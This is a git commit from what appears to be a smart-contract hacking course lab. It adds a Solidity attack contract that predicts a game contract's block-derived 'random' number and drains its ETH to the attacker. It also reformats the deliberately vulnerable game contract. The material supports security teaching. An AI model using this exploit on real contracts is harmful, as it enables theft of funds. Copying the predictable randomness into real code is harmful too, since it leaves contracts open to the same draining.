9d983f23f5020a111cc693dea34ae96e6a3b2ca9
firatstory.eth <talefirat@gmail.com>
2023-05-12 15:56:09 +0200

    implement randomness vulnerabilities-1

---
+++ contracts/randomness-vulnerabilities-1/AttackGame.sol
@@ -0,0 +1,25 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.13;
+
+import "hardhat/console.sol";
+import {Game} from "./Game.sol";
+
+contract AttackGame {
+    Game gameContract;
+    address payable owner;
+
+    constructor(address _game) payable {
+        owner = payable(msg.sender);
+        gameContract = Game(_game);
+    }
+
+    function attack() external {
+        uint256 number = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
+        gameContract.play(number);
+    }
+
+    receive() external payable {
+        (bool success,) = owner.call{value: address(this).balance}("");
+        require(success, "can't send the ETH");
+    }
+}
--- contracts/randomness-vulnerabilities-1/Game.sol
+++ contracts/randomness-vulnerabilities-1/Game.sol
@@ -1,5 +1,7 @@
 // SCH Course Copyright Policy (C): DO-NOT-SHARE-WITH-ANYONE
 // https://smartcontractshacking.com/#copyright-policy
+// SPDX-License-Identifier: MIT
+
 pragma solidity ^0.8.13;
 
 /**
@@ -9,12 +11,11 @@ pragma solidity ^0.8.13;
 contract Game {
     constructor() payable {}
 
-    function play(uint guess) external {
+    function play(uint256 guess) external {
+        uint256 number = uint256(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
 
-        uint number = uint(keccak256(abi.encodePacked(block.timestamp, block.number, block.difficulty)));
-
-        if(guess == number) {
-            (bool sent, ) = msg.sender.call{value: address(this).balance}("");
+        if (guess == number) {
+            (bool sent,) = msg.sender.call{value: address(this).balance}("");
             require(sent, "Failed to send ETH");
         }
     }
